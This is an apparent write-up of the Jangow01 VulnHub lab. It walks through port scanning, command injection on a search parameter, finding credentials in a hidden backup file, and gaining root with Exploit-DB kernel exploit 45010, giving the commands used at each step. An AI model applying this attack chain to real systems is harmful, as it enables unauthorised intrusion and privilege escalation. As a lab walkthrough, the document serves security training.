 Jangow01 - VulnHub Walkthrough

## Description
Jangow01 is an easy-level VulnHub machine focused on enumeration and basic exploitation techniques.  
The goal is to gain user and root access.

---

## Initial Enumeration

Usually jangow01 vulnhub provides the ip when we power up the machine, although we could find it by using 
```bash 
netdiscover -i eth0.
```
First, I performed a basic Nmap scan to identify open ports and services:

```bash
nmap -sV 10.0.2.15
Open Ports
21 → FTP (vsftpd 3.0.3)
80 → HTTP (Apache 2.4.18)

Since a web service is available, I decided to start with web enumeration.

Web Exploration

Navigating to the website, I found the following endpoint:

/site/busque.php?buscar=

This looked interesting, so I tested basic input.

Command Injection

Testing with:

echo test

The output was reflected back, confirming command execution.

To verify:

whoami

Output:

www-data

At this point, I had remote command execution.

Finding Credentials

With command execution available, I started exploring the system:

ls -la /var/www/html

I discovered a hidden file:

.backup

Reading it revealed credentials:

jangow01 : abygurl69
User Access

Using the credentials:

su jangow01

Verification:

whoami

Output:

jangow01

Now I had a more stable shell.

Privilege Escalation

Checking the system:

uname -a

Output:

Linux 4.4.0-31-generic

This is an old kernel, so I searched for local privilege escalation exploits.

First Attempt

I tried exploit 40871, but it kept retrying and did not succeed.

Since it was unstable, I moved on.

Working Exploit

I found another exploit:

Exploit-DB 45010

Uploaded it to the target and compiled it:

gcc 45010.c -o exploit
chmod +x exploit
./exploit
Root Access

After execution:

#

Verification:

whoami

Output:

root
Proof
cd /root
cat proof.txt
Summary

This machine was compromised through:

Command Injection → Initial access
Credential discovery → User access
Kernel exploit → Root access
Key Takeaways
Always test input fields for command injection
Hidden files can expose credentials
Enumeration is critical
Not all exploits work — adapt and try alternatives
